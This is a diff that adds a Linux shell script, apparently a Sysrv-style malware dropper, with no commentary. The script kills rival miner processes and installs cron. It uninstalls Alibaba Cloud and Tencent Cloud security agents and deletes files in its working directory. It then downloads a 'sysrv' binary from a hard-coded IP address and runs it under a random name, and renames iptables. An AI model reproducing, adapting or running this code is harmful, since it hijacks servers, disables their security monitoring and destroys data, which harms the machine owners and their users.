@@ -1,0 +1,51 @@
+cc=http://194.145.227.21
+sys=$(cat /dev/urandom | head -n 9 | md5sum | head -c $(seq 6 12 | sort -R | head -n1))
+
+get() {
+    chattr -i $2; rm -rf $2; curl $1 > $2 || wget -q -O - $1 > $2; chmod +x $2
+}
+
+[ $(getconf LONG_BIT) = 32 ] && exit
+cd /tmp || cd /mnt || cd /root || cd /
+
+pkill -9 solr.sh
+pkill -9 solrd
+ps aux | grep kthreaddi | grep tmp | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | egrep "network0[0-1]|srv00[1-9]|srv01[0-2]" | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep sysrv | grep -v 0 | awk '{print $2}' | xargs -I % kill -9 %
+
+test -x "$(command -v crontab)" || {
+    if [ $(id -u) -eq 0 ]; then
+        apt-get update -y
+        apt-get -y install cron
+        service cron start
+
+        yum update -y
+        yum -y install crontabs
+        service crond start
+    fi
+}
+
+if [ $(id -u) -eq 0 ]; then
+    if ps aux | grep -i '[a]liyun'; then
+        curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
+        curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
+        pkill aliyun-service
+        rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
+        rm -rf /usr/local/aegis*
+        systemctl stop aliyun.service
+        systemctl disable aliyun.service
+        service bcm-agent stop
+        yum remove bcm-agent -y
+        apt-get remove bcm-agent -y
+    elif ps aux | grep -i '[y]unjing'; then
+        /usr/local/qcloud/stargate/admin/uninstall.sh
+        /usr/local/qcloud/YunJing/uninst.sh
+        /usr/local/qcloud/monitor/barad/admin/uninstall.sh
+    fi
+fi
+
+ls -al | xargs rm -rf
+netstat -anp | grep ':52018\|:52019' | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
+get $cc/sysrv $sys; ./$sys
+mv /sbin/iptables /sbin/iptables_
